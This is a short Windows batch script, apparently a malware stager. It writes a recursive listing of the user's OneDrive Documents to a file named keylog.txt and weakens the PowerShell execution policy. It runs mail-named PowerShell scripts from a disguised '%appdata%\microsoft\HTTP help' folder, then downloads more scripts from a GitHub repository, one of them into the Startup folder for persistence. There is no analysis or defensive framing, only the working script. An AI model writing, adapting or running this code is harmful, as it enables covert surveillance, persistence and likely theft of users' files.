@echo off
cd/
cd %USERPROFILE%\OneDrive\Documents\
dir /s > keylog.txt
cls
powershell Set-ExecutionPolicy RemoteSigned
cls
powershell Get-ExecutionPolicy
cls
powershell %appdata%\microsoft\HTTP help\mail2.ps1
powershell %appdata%\microsoft\HTTP help\mail1.ps1
cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
cls
WScript %appdata%\microsoft\HTTP help\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/menu.vbs
cd %appdata%\microsoft\HTTP help\
WScript %appdata%\microsoft\HTTP help\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/mail1.ps1
WScript %appdata%\microsoft\HTTP help\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/mail2.ps1
WScript %appdata%\microsoft\HTTP help\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/download.vbs
WScript %appdata%\microsoft\HTTP help\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/start.bat
WScript %appdata%\microsoft\HTTP help\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/go.bat
@echo off